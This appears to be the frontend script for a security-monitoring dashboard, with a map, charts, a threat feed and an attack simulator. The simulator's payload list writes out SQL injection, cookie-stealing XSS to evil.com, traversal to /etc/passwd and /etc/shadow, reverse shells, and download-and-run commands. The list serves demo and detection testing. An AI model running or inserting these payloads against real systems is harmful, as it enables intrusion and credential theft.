/**
 * SOC Nexus — Frontend Logic
 * Handles: Socket.io real-time events, Leaflet map,
 *           Chart.js charts, attack simulator, UI updates
 */

// ═══════════════════════════════════════════════════════════
// 1. SOCKET.IO CONNECTION
// ═══════════════════════════════════════════════════════════
const socket = io();

// ═══════════════════════════════════════════════════════════
// 2. STATE
// ═══════════════════════════════════════════════════════════
const state = {
  total:    0,
  critical: 0,
  high:     0,
  medium:   0,
  info:     0,
  // For line chart — last 20 timestamps + counts
  lineLabels: [],
  lineData:   [],
  // Doughnut
  threatCounts: {
    'SQL Injection':   0,
    'XSS':             0,
    'Path Traversal':  0,
    'RCE':             0,
    'Normal Traffic':  0,
  }
};

// ═══════════════════════════════════════════════════════════
// 3. LEAFLET MAP
// ═══════════════════════════════════════════════════════════
const map = L.map('attackMap', {
  center: [20, 0],
  zoom: 2,
  zoomControl: true,
  attributionControl: false,
  minZoom: 1,
  maxZoom: 8,
});

// Dark tile layer
L.tileLayer('https://{s}.basemaps.cartocdn.com/dark_all/{z}/{x}/{y}{r}.png', {
  maxZoom: 19,
}).addTo(map);

// Custom attack marker icon (flashing red dot)
function createMarkerIcon(severity) {
  const colors = {
    CRITICAL: '#ff3b3b',
    HIGH:     '#ff7700',
    MEDIUM:   '#ffcc00',
    INFO:     '#4488ff',
  };
  const color = colors[severity] || '#4488ff';
  const size = severity === 'CRITICAL' ? 14 : severity === 'HIGH' ? 12 : 10;

  return L.divIcon({
    className: '',
    html: `
      <div style="
        width:${size}px; height:${size}px;
        background:${color};
        border-radius:50%;
        box-shadow: 0 0 10px ${color}, 0 0 20px ${color}88;
        animation: glowPulse 1.5s ease-in-out infinite;
        border: 1.5px solid rgba(255,255,255,0.4);
      "></div>
    `,
    iconSize: [size, size],
    iconAnchor: [size / 2, size / 2],
  });
}

// Add a marker to the map
function addMapMarker(log) {
  if (!log.latitude || !log.longitude) return;

  const marker = L.marker([log.latitude, log.longitude], {
    icon: createMarkerIcon(log.severity),
  }).addTo(map);

  marker.bindPopup(`
    <div style="
      font-family: 'Share Tech Mono', monospace;
      font-size: 11px;
      background: #050f20;
      color: #e2ecff;
      border: 1px solid #00ff8844;
      border-radius: 4px;
      padding: 10px 14px;
      min-width: 200px;
      line-height: 1.8;
    ">
      <strong style="color:#00ff88; letter-spacing:2px;">⚠ ${log.threat_type}</strong><br>
      <span style="color:#4a6080;">IP:</span> ${log.ip}<br>
      <span style="color:#4a6080;">GEO:</span> ${log.country}<br>
      <span style="color:#4a6080;">SEVERITY:</span>
        <span style="color:${severityColor(log.severity)}">${log.severity}</span><br>
      <span style="color:#4a6080;">TIME:</span> ${formatTime(log.timestamp)}
    </div>
  `, { className: '' });

  // Auto-remove marker after 60 seconds
  setTimeout(() => {
    if (map.hasLayer(marker)) map.removeLayer(marker);
  }, 60000);

  // If critical, briefly pan to it
  if (log.severity === 'CRITICAL') {
    map.flyTo([log.latitude, log.longitude], 4, { duration: 1.5 });
  }
}

// ═══════════════════════════════════════════════════════════
// 4. CHART.JS CHARTS
// ═══════════════════════════════════════════════════════════

// -- Line Chart: Threat Intensity Over Time --
const lineCtx = document.getElementById('lineChart').getContext('2d');
const lineChart = new Chart(lineCtx, {
  type: 'line',
  data: {
    labels: [],
    datasets: [{
      label: 'Threats/min',
      data: [],
      borderColor: '#00ff88',
      backgroundColor: 'rgba(0,255,136,0.07)',
      borderWidth: 2,
      pointRadius: 2,
      pointBackgroundColor: '#00ff88',
      fill: true,
      tension: 0.4,
    }]
  },
  options: {
    responsive: true,
    maintainAspectRatio: false,
    animation: { duration: 400 },
    plugins: {
      legend: { display: false },
    },
    scales: {
      x: {
        ticks: {
          color: '#4a6080',
          font: { family: 'Share Tech Mono', size: 9 },
          maxTicksLimit: 6,
        },
        grid: { color: 'rgba(0,255,136,0.05)' },
        border: { color: 'rgba(0,255,136,0.1)' },
      },
      y: {
        beginAtZero: true,
        ticks: {
          color: '#4a6080',
          font: { family: 'Share Tech Mono', size: 9 },
          precision: 0,
        },
        grid: { color: 'rgba(0,255,136,0.05)' },
        border: { color: 'rgba(0,255,136,0.1)' },
      }
    }
  }
});

// -- Doughnut Chart: Threat Distribution --
const doughnutCtx = document.getElementById('doughnutChart').getContext('2d');
const doughnutChart = new Chart(doughnutCtx, {
  type: 'doughnut',
  data: {
    labels: ['SQL Injection', 'XSS', 'Path Traversal', 'RCE', 'Normal'],
    datasets: [{
      data: [0, 0, 0, 0, 0],
      backgroundColor: [
        'rgba(255,119,0,0.75)',
        'rgba(255,204,0,0.75)',
        'rgba(255,59,59,0.85)',
        'rgba(255,0,80,0.85)',
        'rgba(68,136,255,0.65)',
      ],
      borderColor: [
        '#ff7700', '#ffcc00', '#ff3b3b', '#ff0050', '#4488ff'
      ],
      borderWidth: 1,
      hoverOffset: 6,
    }]
  },
  options: {
    responsive: true,
    maintainAspectRatio: false,
    cutout: '68%',
    animation: { duration: 500 },
    plugins: {
      legend: {
        position: 'right',
        labels: {
          color: '#94a3b8',
          font: { family: 'Share Tech Mono', size: 9 },
          boxWidth: 10,
          padding: 8,
        }
      }
    }
  }
});

// Update line chart by appending current total
const lineHistory = [];
function updateLineChart() {
  const now = new Date();
  const label = now.getHours().toString().padStart(2,'0') + ':'
              + now.getMinutes().toString().padStart(2,'0') + ':'
              + now.getSeconds().toString().padStart(2,'0');

  lineHistory.push({ label, value: state.total });
  if (lineHistory.length > 20) lineHistory.shift();

  lineChart.data.labels   = lineHistory.map(h => h.label);
  lineChart.data.datasets[0].data = lineHistory.map(h => h.value);
  lineChart.update();
}

// Update doughnut with latest threat counts
function updateDoughnutChart() {
  doughnutChart.data.datasets[0].data = [
    state.threatCounts['SQL Injection'],
    state.threatCounts['XSS'],
    state.threatCounts['Path Traversal'],
    state.threatCounts['RCE'],
    state.threatCounts['Normal Traffic'],
  ];
  doughnutChart.update();
}

// ═══════════════════════════════════════════════════════════
// 5. UI HELPERS
// ═══════════════════════════════════════════════════════════
function severityColor(sev) {
  const map = { CRITICAL: '#ff3b3b', HIGH: '#ff7700', MEDIUM: '#ffcc00', INFO: '#4488ff' };
  return map[sev] || '#94a3b8';
}

function formatTime(ts) {
  const d = new Date(ts);
  return d.toLocaleTimeString('en-GB', { hour12: false });
}

function formatDateTime(ts) {
  const d = new Date(ts);
  return d.toLocaleString('en-GB', { hour12: false });
}

// Update top-bar counters
function updateCounters() {
  document.getElementById('statTotal').textContent    = state.total;
  document.getElementById('statCritical').textContent = state.critical;
  document.getElementById('statHigh').textContent     = state.high;
  document.getElementById('statMedium').textContent   = state.medium;

  document.getElementById('pillCritical').textContent = state.critical;
  document.getElementById('pillHigh').textContent     = state.high;
  document.getElementById('pillMedium').textContent   = state.medium;
  document.getElementById('pillInfo').textContent     = state.info;

  document.getElementById('eventCount').textContent   = state.total;
}

// Build a severity badge HTML
function badgeHTML(sev) {
  return `<span class="badge badge-${sev}">${sev}</span>`;
}

// Prepend a row to the full threat feed
function prependFeedRow(log) {
  const tbody = document.getElementById('feedTableBody');

  // Remove placeholder row
  const placeholder = tbody.querySelector('td[colspan]');
  if (placeholder) placeholder.closest('tr').remove();

  const tr = document.createElement('tr');
  tr.className = `row-${log.severity} row-flash`;
  tr.innerHTML = `
    <td style="color:var(--text-dim);font-size:11px;">${log.id || '—'}</td>
    <td>${badgeHTML(log.severity)}</td>
    <td style="color:var(--text-secondary);font-size:11px;">${log.threat_type}</td>
    <td style="color:var(--blue);font-size:11px;">${log.ip}</td>
    <td style="font-size:11px;">${log.country}</td>
    <td class="payload-cell" title="${escapeHtml(log.payload)}">${escapeHtml(log.payload)}</td>
    <td style="color:var(--text-dim);font-size:10px;">${formatDateTime(log.timestamp)}</td>
  `;

  tbody.insertBefore(tr, tbody.firstChild);

  // Keep max 200 rows
  while (tbody.rows.length > 200) tbody.deleteRow(tbody.rows.length - 1);
}

// Prepend a row to the mini event table
function prependMiniRow(log) {
  const tbody = document.getElementById('miniTableBody');
  const tr = document.createElement('tr');
  tr.className = `row-${log.severity}`;
  tr.innerHTML = `
    <td>${badgeHTML(log.severity)}</td>
    <td style="color:var(--text-secondary);font-size:10px;">${log.threat_type}</td>
    <td style="color:var(--blue);font-size:10px;">${log.ip}</td>
    <td style="font-size:10px;">${log.country}</td>
  `;
  tbody.insertBefore(tr, tbody.firstChild);
  while (tbody.rows.length > 15) tbody.deleteRow(tbody.rows.length - 1);

  // Update "last event" label
  document.getElementById('lastEvent').textContent = formatTime(log.timestamp);
}

// Escape HTML to prevent XSS in payload display
function escapeHtml(str) {
  const div = document.createElement('div');
  div.textContent = str;
  return div.innerHTML;
}

// Show the alert banner for critical threats
let bannerTimeout = null;
function showCriticalAlert(log) {
  const banner = document.getElementById('alertBanner');
  banner.style.display = 'block';
  banner.textContent = `⚠ CRITICAL THREAT: ${log.threat_type} from ${log.ip} (${log.country})`;

  clearTimeout(bannerTimeout);
  bannerTimeout = setTimeout(() => { banner.style.display = 'none'; }, 6000);

  // Show modal
  const modal = document.getElementById('alertModal');
  const body  = document.getElementById('alertModalBody');
  body.innerHTML = `
    <span class="field">TYPE:    </span><span class="value">${log.threat_type}</span><br>
    <span class="field">IP:      </span><span class="value">${log.ip}</span><br>
    <span class="field">COUNTRY: </span><span class="value">${log.country}</span><br>
    <span class="field">PAYLOAD: </span><span class="value">${escapeHtml(log.payload).substring(0, 60)}…</span><br>
    <span class="field">TIME:    </span><span class="value">${formatDateTime(log.timestamp)}</span>
  `;
  modal.style.display = 'block';
  setTimeout(() => { modal.style.display = 'none'; }, 7000);
}

// ═══════════════════════════════════════════════════════════
// 6. PROCESS A NEW LOG (from socket or history)
// ═══════════════════════════════════════════════════════════
function processLog(log, flash = true) {
  // Update state counters
  state.total++;
  if (log.severity === 'CRITICAL') state.critical++;
  else if (log.severity === 'HIGH')   state.high++;
  else if (log.severity === 'MEDIUM') state.medium++;
  else                                state.info++;

  // Update threat type counts
  const key = log.threat_type in state.threatCounts ? log.threat_type : 'Normal Traffic';
  state.threatCounts[key]++;

  // Update all UI elements
  updateCounters();
  prependFeedRow(log);
  prependMiniRow(log);
  addMapMarker(log);
  updateLineChart();
  updateDoughnutChart();

  // Alert for critical
  if (flash && log.severity === 'CRITICAL') {
    showCriticalAlert(log);
  }
}

// ═══════════════════════════════════════════════════════════
// 7. SOCKET.IO EVENT HANDLERS
// ═══════════════════════════════════════════════════════════

// Receive history on initial connect
socket.on('history', (logs) => {
  logs.forEach(log => processLog(log, false));
});

// Receive new real-time log
socket.on('new_log', (log) => {
  processLog(log, true);
});

socket.on('connect', () => {
  console.log('[SOC] Connected to server via WebSocket');
});

socket.on('disconnect', () => {
  console.warn('[SOC] Disconnected from server');
});

// ═══════════════════════════════════════════════════════════
// 8. ATTACK SIMULATOR
// ═══════════════════════════════════════════════════════════
const PAYLOADS = {
  normal: [
    "GET /index.html HTTP/1.1",
    "POST /api/users { name: 'Alice' }",
    "GET /products?page=1&limit=20",
    "User-Agent: Mozilla/5.0",
    "GET /assets/logo.png",
  ],
  sqli: [
    "' OR 1=1 --",
    "admin' UNION SELECT username, password FROM users --",
    "1; DROP TABLE users; --",
    "' OR '1'='1' /*",
    "1 AND SLEEP(5)--",
    "UNION SELECT NULL, version(), database()--",
  ],
  xss: [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert(document.cookie)>",
    "javascript:eval(atob('YWxlcnQoMSk='))",
    "<svg onload=fetch('https://evil.com?c='+document.cookie)>",
    "<iframe src='javascript:alert(1)'></iframe>",
  ],
  path: [
    "../../../../etc/passwd",
    "../../../windows/system32/cmd.exe",
    "/etc/shadow",
    "..%2f..%2f..%2fetc%2fpasswd",
    "....//....//etc/passwd",
  ],
  rce: [
    "cmd.exe /c whoami",
    "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
    "powershell -nop -c IEX(New-Object Net.WebClient).downloadString('http://evil.com/shell.ps1')",
    "/bin/sh -c 'wget http://evil.com/backdoor -O /tmp/bd && chmod +x /tmp/bd && /tmp/bd'",
    "system('nc -e /bin/bash 10.0.0.1 4444')",
  ],
};

// Simulated source IPs for variety
const SIM_IPS = [
  '185.220.101.45', '92.63.197.153', '194.165.16.11',
  '45.142.212.100', '103.75.190.5', '193.32.162.33',
  '91.240.118.222', '5.188.206.26', '185.56.80.65',
  '31.41.244.93'
];

async function simulate(type) {
  const payloads = PAYLOADS[type];
  if (!payloads) return;

  const payload = payloads[Math.floor(Math.random() * payloads.length)];
  const ip      = SIM_IPS[Math.floor(Math.random() * SIM_IPS.length)];

  try {
    const res = await fetch('/api/simulate', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ payload, ip }),
    });
    const data = await res.json();
    if (!res.ok) console.error('[SIM] Error:', data.error);
  } catch (err) {
    console.error('[SIM] Fetch error:', err);
  }
}

// ═══════════════════════════════════════════════════════════
// 9. CLEAR FEED
// ═══════════════════════════════════════════════════════════
function clearFeed() {
  document.getElementById('feedTableBody').innerHTML = `
    <tr>
      <td colspan="7" style="text-align:center;color:var(--text-dim);font-family:var(--font-mono);font-size:11px;padding:32px;">
        FEED CLEARED — AWAITING NEW EVENTS...
      </td>
    </tr>
  `;
  document.getElementById('miniTableBody').innerHTML = '';
}

// ═══════════════════════════════════════════════════════════
// 10. CLOCK
// ═══════════════════════════════════════════════════════════
function updateClock() {
  const now = new Date();
  document.getElementById('clock').textContent =
    now.toLocaleTimeString('en-GB', { hour12: false });
}
setInterval(updateClock, 1000);
updateClock();

// ═══════════════════════════════════════════════════════════
// 11. AUTO-DEMO: Seed some simulated traffic every 8s
//     (Optional — comment out for silent mode)
// ═══════════════════════════════════════════════════════════
const DEMO_TYPES = ['normal', 'sqli', 'xss', 'path', 'rce', 'normal', 'normal'];

let demoIdx = 0;
setTimeout(function autoDemo() {
  const type = DEMO_TYPES[demoIdx % DEMO_TYPES.length];
  simulate(type);
  demoIdx++;
  setTimeout(autoDemo, 6000 + Math.random() * 6000);
}, 3000);